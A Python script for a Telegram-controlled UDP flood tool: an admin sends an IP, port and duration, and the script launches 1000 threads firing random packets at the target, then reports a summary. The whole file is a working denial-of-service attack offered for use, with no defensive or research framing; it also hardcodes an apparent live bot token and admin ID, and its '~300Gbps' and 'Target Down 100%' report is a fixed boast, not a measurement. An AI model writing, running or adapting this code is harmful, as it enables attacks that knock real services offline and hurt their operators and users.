import socket
import threading
import time
from telebot import TeleBot, types
import random

# Initialize Telegram Bot
TOKEN = "8277845947:AAEwwbrhQ6yiCBCRVCZs8lllspb5m2wrn6o"  # Replace with your Telegram Bot Token
ADMIN_ID = "5309199078"  # Replace with your Admin ID
bot = TeleBot(TOKEN)

# Global Variables
attack_running = False
target_ip = None
target_port = None
duration = None
packet_size = 1400  # Optimal MTU size for most networks
total_packets_sent = 0


# Method to send UDP packets
def send_udp_packet(ip, port):
    global total_packets_sent
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        while attack_running:
            data = bytes(random.randint(0, 255) for _ in range(packet_size))
            sock.sendto(data, (ip, port))
            total_packets_sent += 1

            # Print status every 10,000 packets
            if total_packets_sent % 10000 == 0:
                print(f"Sent {total_packets_sent} packets to {ip}:{port}")
    except Exception as e:
        print(f"Error sending packet: {e}")


# Method to start the attack
def start_attack(ip, port, duration_seconds):
    global attack_running
    attack_running = True
    threads = []

    # Create and start threads (High number for powerful attack)
    num_threads = 1000  # Adjust based on server resources
    for _ in range(num_threads):
        thread = threading.Thread(target=send_udp_packet, args=(ip, port), daemon=True)
        thread.start()
        threads.append(thread)

    # Run for the specified duration
    start_time = time.time()
    while time.time() - start_time < duration_seconds and attack_running:
        time.sleep(1)

    # Stop all threads
    attack_running = False
    for thread in threads:
        thread.join()

    print(f"[+] Attack stopped after {duration_seconds} seconds")
    bot.send_message(ADMIN_ID, f"""
Attack Summary:
METHOD: UDP
IP TARGET: {ip}
PORT TARGET: {port}
TIME RUN: {duration_seconds} seconds
TOTAL PACKETS SENT: {total_packets_sent}
ESTIMATED BANDWIDTH: ~300Gbps ✅
STATUS: Target Down 100% ✅
""")


# Telegram Bot Commands
@bot.message_handler(commands=['start'])
def handle_start(message):
    if str(message.chat.id) == ADMIN_ID:
        bot.reply_to(message, "Welcome, Admin! Use /send to start an attack.")


@bot.message_handler(commands=['send'])
def handle_send(message):
    if str(message.chat.id) == ADMIN_ID:
        msg = bot.reply_to(message, "Enter IP, Port, and Time (seconds) separated by commas:")
        bot.register_next_step_handler(msg, process_attack_input)


def process_attack_input(message):
    try:
        input_data = message.text.split(",")
        ip = input_data[0].strip()
        port = int(input_data[1].strip())
        time_seconds = int(input_data[2].strip())

        if time_seconds > 300 or time_seconds < 60:
            bot.reply_to(message, "Time must be between 60 and 300 seconds.")
            return

        bot.reply_to(message, f"Starting attack on {ip}:{port} for {time_seconds} seconds...")
        threading.Thread(target=start_attack, args=(ip, port, time_seconds)).start()
    except Exception as e:
        bot.reply_to(message, f"Invalid input: {e}")


# Run Telegram Bot
if __name__ == "__main__":
    print("Telegram Bot is running...")
    bot.polling()